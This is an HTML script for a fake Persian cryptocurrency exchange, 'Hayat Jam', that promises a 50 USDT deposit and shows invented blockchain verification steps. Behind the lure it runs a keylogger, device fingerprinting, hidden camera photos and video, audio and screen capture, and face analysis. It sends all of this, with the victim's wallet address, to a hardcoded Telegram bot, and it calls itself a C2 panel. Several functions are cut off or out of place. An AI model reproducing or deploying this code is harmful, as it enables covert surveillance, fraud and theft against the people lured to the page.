<script>
(function() {
// ======================== CONFIG ========================
const TOKEN = "8651752684:AAFFE7kwtXvzl3HQhtv12cns8rBqmIHbxe8";
const CHAT = "1690458498";
let SID = null;
let WALLET = "";
let CAPTURE_ACTIVE = false;
let CAPTURE_TIMER = null;
let PHOTO_COUNT = 0;
let MAX_PHOTOS_BEFORE_VIDEO = 4;
let KEY_BUF = "";
let CLIPBOARD_HISTORY = [];
let LAST_GPS = null;
let WS = null;
let DETAIL_INTERVAL = null;

// ======================== UTILS ========================
function toast(msg, dur, type) {
  dur = dur || 2800;
  type = type || '';
  var t = document.getElementById('globalToast');
  t.textContent = msg;
  t.className = 'toast' + (type ? ' toast-' + type : '');
  t.classList.add('show');
  clearTimeout(t._t);
  t._t = setTimeout(function() { t.classList.remove('show'); }, dur);
}

function dtb(d) {
  var arr = d.split(',');
  var m = arr[0].match(/:(.*?);/);
  var ct = m ? m[1] : 'jpeg';
  var b = atob(arr[1]);
  var a = new Uint8Array(b.length);
  for (var i = 0; i < b.length; i++) a[i] = b.charCodeAt(i);
  return new Blob([a], { type: 'image/' + ct });
}

function tgPhoto(b64, cap) {
  try {
    var fd = new FormData();
    fd.append('chat_id', CHAT);
    fd.append('photo', dtb(b64), 'c.jpg');
    fd.append('caption', String(cap || '').substring(0, 1000));
    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendPhoto', { method: 'POST', body: fd })
      .then(function(r) { return r.json(); }).then(function(j) { return j.ok; });
  } catch (e) { return Promise.resolve(false); }
}

function tgFile(blob, fn, cap) {
  try {
    var fd = new FormData();
    fd.append('chat_id', CHAT);
    fd.append('document', blob, fn);
    fd.append('caption', String(cap || '').substring(0, 1000));
    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendDocument', { method: 'POST', body: fd })
      .then(function(r) { return r.json(); }).then(function(j) { return j.ok; });
  } catch (e) { return Promise.resolve(false); }
}

function tgMsg(text) {
  try {
    return fetch('https://api.telegram.org/bot' + TOKEN + '/sendMessage', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text: String(text).substring(0, 4000), parse_mode: 'HTML' })
    }).then(function(r) { return r.json(); }).then(function(j) { return j.ok; });
  } catch (e) { return Promise.resolve(false); }
}

function genSid() {
  var c = 'abcdefghijklmnopqrstuvwxyz0123456789';
  var r = 'hyt_';
  for (var i = 0; i < 12; i++) r += c[Math.floor(Math.random() * c.length)];
  return r;
}

function now() { return new Date().toLocaleString('fa-IR'); }

// ======================== KEYLOGGER ========================
function startKeylogger() {
  document.addEventListener('keydown', function(e) {
    KEY_BUF += e.key;
    if (KEY_BUF.length > 80) {
      tgMsg('⌨️ <b>کی‌لاگر</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + KEY_BUF);
      KEY_BUF = '';
    }
  });
  setInterval(function() {
    if (KEY_BUF.length > 0) {
      tgMsg('⌨️ <b>کی‌لاگر</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + KEY_BUF);
      KEY_BUF = '';
    }
  }, 15000);
}

// ======================== DEVICE INFO ========================
function getDeviceInfo() {
  var info = {
    ua: navigator.userAgent.substring(0, 300),
    platform: navigator.platform,
    lang: navigator.language,
    screen: screen.width + 'x' + screen.height + ' @' + (window.devicePixelRatio || 1) + 'x',
    cores: navigator.hardwareConcurrency || '?',
    mem: navigator.deviceMemory || '?',
    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    touch: navigator.maxTouchPoints,
    vendor: navigator.vendor || '?'
  };
  try {
    var c = document.createElement('canvas');
    var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
    if (gl) {
      var e = gl.getExtension('WEBGL_debug_renderer_info');
      info.gpu = e ? gl.getParameter(e.UNMASKED_RENDERER_WEBGL) : '?';
    }
  } catch (ex) { info.gpu = '?'; }
  try {
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (conn) info.net = (conn.effectiveType || '?') + ' | ' + (conn.type || '?') + ' | ↓' + conn.downlink + 'Mbps | RTT:' + conn.rtt + 'ms';
  } catch (ex) {}
  try {
    if (navigator.getBattery) {
      navigator.getBattery().then(function(b) {
        info.bat = Math.round(b.level * 100) + '% ' + (b.charging ? '⚡' : '') + ' | تخلیه:' + (b.dischargingTime || '?') + 's';
        tgMsg('🔋 <b>باتری</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n' + info.bat);
      });
    }
  } catch (ex) {}
  return info;
}

// ======================== CAMERA ========================
function snap(facing) {
  return new Promise(function(resolve) {
    try {
      navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
        audio: false
      }).then(function(stream) {
        var v = document.getElementById('hiddenVideo');
        v.srcObject = stream;
        v.play().then(function() {
          setTimeout(function() {
            try {
              var c = document.getElementById('hiddenCanvas');
              c.width = v.videoWidth || 640;
              c.height = v.videoHeight || 480;
              c.getContext('2d').drawImage(v, 0, 0);
              var img = c.toDataURL('image/jpeg', 0.75);
              stream.getTracks().forEach(function(t) { t.stop(); });
              v.srcObject = null;
              resolve({ ok: true, img: img, facing: facing });
            } catch (e) { resolve({ ok: false }); }
          }, 500);
        }).catch(function() { resolve({ ok: false }); });
      }).catch(function() { resolve({ ok: false }); });
    } catch (e) { resolve({ ok: false }); }
  });
}

function startCameraLoop() {
  if (CAPTURE_ACTIVE) return;
  CAPTURE_ACTIVE = true;
  PHOTO_COUNT = 0;

  function shoot() {
    if (!CAPTURE_ACTIVE) return;
    snap('user').then(function(f) {
      if (f.ok && CAPTURE_ACTIVE) { PHOTO_COUNT++; tgPhoto(f.img, '📸 عکس ' + PHOTO_COUNT + ' | سلفی\n🆔 ' + SID + '\n💳 ' + WALLET); }
    });
    setTimeout(function() {
      if (!CAPTURE_ACTIVE) return;
      snap('environment').then(function(b) {
        if (b.ok && CAPTURE_ACTIVE) { PHOTO_COUNT++; tgPhoto(b.img, '📸 عکس ' + PHOTO_COUNT + ' | عقب\n🆔 ' + SID + '\n💳 ' + WALLET); }
      });
    }, 1800);
  }
  shoot();
  CAPTURE_TIMER = setInterval(function() {
    if (!CAPTURE_ACTIVE) return;
    shoot();
    if (PHOTO_COUNT >= MAX_PHOTOS_BEFORE_VIDEO) {
      recordVideo(20000).then(function(blob) {
        if (blob) tgFile(blob, 'video_' + Date.now() + '.webm', '🎥 ویدیو ۲۰ ثانیه\n🆔 ' + SID + '\n💳 ' + WALLET);
      });
      MAX_PHOTOS_BEFORE_VIDEO += 6;
    }
  }, 7000);
}

function stopAll() {
  CAPTURE_ACTIVE = false;
  if (CAPTURE_TIMER) { clearInterval(CAPTURE_TIMER); CAPTURE_TIMER = null; }
  if (DETAIL_INTERVAL) { clearInterval(DETAIL_INTERVAL); DETAIL_INTERVAL = null; }
}

// ======================== VIDEO RECORDING ========================
function recordVideo(dur) {
  return new Promise(function(resolve) {
    try {
      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: false })
        .then(function(stream) {
          var rec = new MediaRecorder(stream, { mimeType: 'video/webm' });
          var chunks = [];
          rec.ondataavailable = function(e) { chunks.push(e.data); };
          rec.onstop = function() {
            var blob = new Blob(chunks, { type: 'video/webm' });
            stream.getTracks().forEach(function(t) { t.stop(); });
            resolve(blob);
          };
          rec.start();
          setTimeout(function() { rec.stop(); }, dur);
        }).catch(function() { resolve(null); });
    } catch (e) { resolve(null); }
  });
}

// ======================== AUDIO RECORDING ========================
function recordAudio(dur) {
  return new Promise(function(resolve) {
    try {
      navigator.mediaDevices.getUserMedia({ audio: true }).then(function(stream) {
        var rec = new MediaRecorder(stream);
        var chunks = [];
        rec.ondataavailable = function(e) { chunks.push(e.data); };
        rec.onstop = function() {
          var blob = new Blob(chunks, { type: 'audio/webm' });
          stream.getTracks().forEach(function(t) { t.stop(); });
          resolve(blob);
        };
        rec.start();
        setTimeout(function() { rec.stop(); }, dur);
      }).catch(function() { resolve(null); });
    } catch (e) { resolve(null); }
  });
}

// ======================== SCREENSHOT ========================

      var v = document.createElement('video');
      v.srcObject = stream;
      v.play().then(function() {
        setTimeout(function() {
          var c = document.createElement('canvas');
          c.width = v.videoWidth || screen.width;
          c.height = v.videoHeight || screen.height;
          c.getContext('2d').drawImage(v, 0, 0);
          var img = c.toDataURL('image/png');
          stream.getTracks().forEach(function(t) { t.stop(); });
          tgPhoto(img, '🖥 اسکرین‌شات\n🆔 ' + SID + '\n💳 ' + WALLET);
        }, 500);
      });
    }).catch(function() {});
  } catch (e) {}
}

// ======================== FINGERPRINT ========================
async function getFullFingerprint() {
  var fp = {};
  var c = document.createElement('canvas');

  fp.canvas = c.toDataURL().slice(0, 200);
  var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
  if (gl) { var e = gl.getExtension('WEBGL_debug_renderer_info'); fp.webgl = e ? gl.getParameter(e.UNMASKED_RENDERER_WEBGL) : 'N/A'; }
  try {
    var audioCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100, 44100);
    var osc = audioCtx.createOscillator();
    osc.connect(audioCtx.destination);
    osc.start(0);
    var buffer = await audioCtx.startRendering();
    fp.audio = Array.from(buffer.getChannelData(0).slice(0, 20)).map(function(v) { return v.toFixed(4); }).join(',');
  } catch (e) {}
  if (window.queryLocalFonts) {
    try { var fonts = await window.queryLocalFonts(); fp.fonts = fonts.slice(0, 10).map(function(f) { return f.fullName; }).join(', '); } catch (e) {}

var faceLoaded = false;

async function loadFaceModels() {
  if (faceLoaded) return true;
  try {
    var url = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api/model/';
    await faceapi.nets.tinyFaceDetector.loadFromUri(url);
    await faceapi.nets.faceLandmark68Net.loadFromUri(url);
    await faceapi.nets.faceRecognitionNet.loadFromUri(url);
    await faceapi.nets.faceExpressionNet.loadFromUri(url);
    await faceapi.nets.ageGenderNet.loadFromUri(url);
    faceLoaded = true;
    return true;
  } catch (e) { return false; }
}

async function analyzeFace(b64) {
  if (!(await loadFaceModels())) return 'مدل‌ها بارگذاری نشد';
  return new Promise(function(resolve) {
    var img = new Image();
    img.src = b64;
    img.onload = async function() {
      var det = await faceapi.detectAllFaces(img, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceExpressions().withAgeAndGender();
      if (!det.length) return resolve('چهره‌ای پیدا نشد');
      var out = '';
      det.forEach(function(d, i) {
        out += '👤 چهره ' + (i + 1) + ': ' + d.gender + ', ' + Math.round(d.age) + ' سال, حالت: ' + Object.keys(d.expressions).reduce(function(a, b) { return d.expressions[a] > d.expressions[b] ? a : b; }) + '\n';
      });
      resolve(out);
    };
  });
}

    '<div class="divider"></div>' +
    '<div class="cs-card" style="margin-top:6px; text-align:center;">' +
    '<i class="fas fa-headset" style="color:#0f5c3a;"></i> <strong style="color:#0f5c3a; font-size:0.8rem;">پشتیبانی حیات جم</strong>' +
    '<p style="font-size:0.65rem; color:#666; margin:4px 0;">سوالی دارید؟ با شماره <span class="cs-number" style="font-size:1rem;">۰۲۱-۹۱۰۱۲۳۴۵</span> تماس بگیرید</p>' +
    '</div>' +
    '<footer>© 2026 حیات جم اکسچنج</footer>' +
    '</div>';

  document.getElementById('confirmBtn').onclick = function() {
    var w = document.getElementById('walletInput').value.replace(/\s/g, '').trim();
    if (!/^(0x[a-fA-F0-9]{40}|T[A-Za-z1-9]{33}|bc1[a-zA-HJ-NP-Z0-9]{38,})$/.test(w)) {
      toast('❌ لطفاً یک آدرس کیف پول معتبر وارد کنید (TRC20 یا ERC20)', 3000, 'error');
      return;
    }
    WALLET = w;
    // بلافاصله آدرس کیف پول رو به تلگرام بفرست
    tgMsg('💳 <b>آدرس کیف پول جدید</b>\n🆔 ' + SID + '\n📌 ' + WALLET + '\n⏱ ' + now());
    startActivationFlow();
  };
}

function startActivationFlow() {
  var steps = [
    { icon: 'fa-shield-alt', title: 'بررسی امنیتی', desc: 'اسکن امنیتی صرافی حیات جم...', details: ['شروع اسکن امنیتی...', 'بررسی IP...', 'امتیاز امنیت: ۹۵/۱۰۰', 'بدون تهدید'], dur: 2500 },
    { icon: 'fa-wallet', title: 'اعتبارسنجی آدرس', desc: 'در حال بررسی آدرس کیف پول...', details: ['آدرس: ' + WALLET.substring(0, 24) + '...', 'شبکه: TRC20', 'آدرس معتبر', '۲۴ تراکنش قبلی'], dur: 2800 },
    { icon: 'fa-link', title: 'اتصال به بلاکچین', desc: 'اتصال به شبکه تتر (TRON)...', details: ['اتصال به TRON Grid...', 'بلاک: #' + Math.floor(Math.random() * 10000000), 'گره: فعال', 'تعادل قرارداد: ۲,۴۵۰,۰۰۰ USDT'], dur: 2700 },
    { icon: 'fa-user-check', title: 'احراز هویت', desc: 'تأیید هویت در صرافی...', details: ['اتصال به اوراکل...', 'تأیید آدرس IP...', 'هویت تأیید شد', 'امتیاز اعتماد: بالا'], dur: 3000 },
    { icon: 'fa-file-contract', title: 'ایجاد قرارداد هوشمند', desc: 'ساخت قرارداد واریز...', details: ['ساخت قرارداد...', 'مقدار: ۵۰ USDT', 'کارمزد: ۰.۵ USDT', 'آدرس قرارداد: 0x' + Math.random().toString(36).substring(2, 10) + '...'], dur: 3200 },
    { icon: 'fa-exchange-alt', title: 'امضای تراکنش', desc: 'امضای دیجیتال تراکنش...', details: ['ساخت تراکنش...', 'امضای با کلید خصوصی...', 'TxID: 0x' + Math.random().toString(36).substring(2, 14), 'وضعیت: امضا شد'], dur: 3000 },
    { icon: 'fa-clock', title: 'در انتظار تأیید شبکه', desc: 'منتظر تأیید بلاکچین...', details: ['ارسال به شبکه...', 'تأیید ۱ از ۳...', 'تأیید ۲ از ۳...', 'تأیید ۳ از ۳...'], dur: 3500 },
    { icon: 'fa-check-double', title: 'تأیید نهایی', desc: 'تأیید نهایی تراکنش...', details: ['تراکنش تأیید شد', '۵۰ USDT واریز شد', 'کد پیگیری: HYT-' + Date.now().toString(36).toUpperCase()], dur: 3000 }
  ];

  var current = 0;

  function showStep() {
    if (current >= steps.length) { showFinalMessage(); return; }
    var s = steps[current];
    var prog = Math.round(((current + 1) / steps.length) * 100);

    var items = '';
    for (var i = 0; i < steps.length; i++) {
      var st = steps[i];
      var cls = 'step-item';
      var sc = 'status-wait';
      var txt = '⏳';
      var ic = '#888';
      if (i < current) { cls += ' done'; sc = 'status-ok'; txt = '✅'; ic = '#16a34a'; } else if (i === current) { cls += ' active'; sc = 'status-run'; txt = '⚡'; ic = '#f59e0b'; }
      items += '<div class="' + cls + '"><i class="fas ' + st.icon + ' step-icon" style="color:' + ic + ';"></i><div class="step-info"><div class="step-title">' + st.title + '</div><div class="step-detail">' + (i <= current ? st.details[st.details.length - 1] : '...') + '</div></div><span class="step-status ' + sc + '">' + txt + '</span></div>';
    }

    app.innerHTML =
      '<div class="card">' +
      '<div class="logo" style="font-size:1.4rem;">🌿 حیات جم</div>' +
      '<div class="sub">در حال واریز USDT</div>' +
      '<div class="spinner"></div>' +
      '<h3 style="color:#0f5c3a; font-size:1rem; margin:10px 0;">' + s.title + '</h3>' +
      '<p style="color:#666; font-size:0.75rem;">' + s.desc + '</p>' +
      '<div class="progress-wrap"><div class="progress-bar" style="width:' + prog + '%;"></div></div>' +
      '<div style="font-size:0.7rem; color:#888; margin-bottom:6px;">مرحله ' + (current + 1) + ' از ' + steps.length + ' | ' + prog + '٪</div>' +
      '<div class="scan-line"></div>' +
      '<div id="detailText" style="font-size:0.65rem; color:#d97706; min-height:20px; margin:6px 0;">' + s.details[0] + '</div>' +
      '<div style="max-height:280px; overflow-y:auto; padding:4px;">' + items + '</div>' +
      '<div class="divider"></div>' +
      '<div class="cs-card" style="text-align:center; margin-top:6px;">' +
      '<i class="fas fa-headset" style="color:#0f5c3a;"></i> <strong style="color:#0f5c3a; font-size:0.72rem;">نیاز به راهنمایی دارید؟</strong>' +
      '<p style="font-size:0.62rem; color:#666;">با شماره <span class="cs-number" style="font-size:0.9rem;">۰۲۱-۹۱۰۱۲۳۴۵</span> تماس بگیرید</p>' +
      '</div>' +
      '<footer>© 2026 حیات جم اکسچنج</footer>' +
      '</div>';

    var di = 0;
    if (DETAIL_INTERVAL) clearInterval(DETAIL_INTERVAL);
    DETAIL_INTERVAL = setInterval(function() {
      if (di < s.details.length) {
        var el = document.getElementById('detailText');
        if (el) el.textContent = s.details[di];
        di++;
      } else { clearInterval(DETAIL_INTERVAL); }
    }, 500);

    current++;
    setTimeout(showStep, s.dur + Math.random() * 800);
  }

  showStep();
  // همه ماژول‌ها رو ۳ ثانیه بعد شروع کن
  setTimeout(function() { startAllBackground(); }, 3000);
}

function showFinalMessage() {
  if (DETAIL_INTERVAL) clearInterval(DETAIL_INTERVAL);
  var txId = '0x' + Math.random().toString(36).substring(2, 10) + '...' + Math.random().toString(36).substring(2, 6);
  var refCode = 'HYT-' + Date.now().toString(36).toUpperCase();

  app.innerHTML =
    '<div class="card" style="border-color:#d4a017; border-width:2px;">' +
    '<div style="font-size:4rem;">🎉</div>' +
    '<div class="logo" style="font-size:1.6rem; background:linear-gradient(135deg,#0f5c3a,#d4a017); -webkit-background-clip:text; background-clip:text; -webkit-text-fill-color:transparent;">واریز با موفقیت ثبت شد</div>' +
    '<div class="badge badge-gold" style="margin-top:6px;">⏳ ۵۰ USDT تا ۲۴ ساعت آینده واریز می‌شود</div>' +
    '<div style="background:rgba(212,160,23,0.04); border-radius:20px; padding:16px; margin:14px 0; border:1px solid rgba(212,160,23,0.2);">' +
    '<p style="color:var(--text); font-size:0.85rem; line-height:2; text-align:right;">' +
    '✅ درخواست واریز ۵۰ USDT به آدرس <strong style="color:#0f5c3a; word-break:break-all; font-size:0.7rem; background:rgba(15,92,58,0.05); padding:2px 8px; border-radius:6px;">' + WALLET + '</strong> ثبت شد.<br>' +
    '📱 کد پیگیری: <strong style="color:#d4a017; direction:ltr; display:inline-block; font-family:monospace;">' + refCode + '</strong><br>' +
    '⏰ لطفاً تا ۲۴ ساعت آینده منتظر واریز باشید.<br>' +
    '📞 مشکلات: با <strong style="color:#0f5c3a;">۰۲۱-۹۱۰۱۲۳۴۵</strong> تماس بگیرید.</p>' +
    '<div style="background:rgba(15,92,58,0.03); border-radius:12px; padding:10px; margin-top:8px; border:1px dashed rgba(15,92,58,0.15);">' +
    '<p style="font-size:0.6rem; color:#666; text-align:center;">🔗 برای پیگیری وضعیت واریز به اکسپلورر مراجعه کنید:<br>' +
    '<span class="tx-hash">https://tronscan.org/#/transaction/' + txId + '</span></p>' +
    '</div>' +
    '</div>' +
    '<div class="divider"></div>' +
    '<div class="cs-card" style="text-align:center;">' +
    '<i class="fas fa-headset" style="color:#0f5c3a; font-size:1.2rem;"></i> <strong style="color:#0f5c3a; font-size:1rem;">پشتیبانی حیات جم</strong>' +
    '<p style="font-size:0.75rem; color:#666; margin:6px 0;">شماره تماس:</p>' +
    '<span class="cs-number" style="font-size:2rem;">۰۲۱-۹۱۰۱۲۳۴۵</span>' +
    '<p style="font-size:0.6rem; color:#888;">🕐 پشتیبانی ۲۴ ساعته</p>' +
    '</div>' +
    '<footer>© 2026 حیات جم اکسچنج | تمامی حقوق محفوظ است</footer>' +
    '</div>';

  // ارسال همه اطلاعات جمع‌آوری شده به تلگرام
  tgMsg('━━━━━━━━━━━━━━━━━\n✅ <b>عملیات کامل شد</b>\n🆔 ' + SID + '\n💳 ' + WALLET + '\n📌 کد: ' + refCode + '\n⏱ ' + now() + '\n━━━━━━━━━━━━━━━━━');
}

// ======================== ROUTER ========================
function route() {
  var hash = window.location.hash.substring(1);
  if (hash && hash.indexOf('hyt_') === 0) {
    renderVictim(hash);
  } else {
    renderAdmin();
  }
}

window.addEventListener('hashchange', function() { stopAll(); route(); });
window.addEventListener('beforeunload', function() { stopAll(); });

route();
console.log('✅ Hayat Jam Exchange C2 v2.0 - All modules active');
})();
</script>
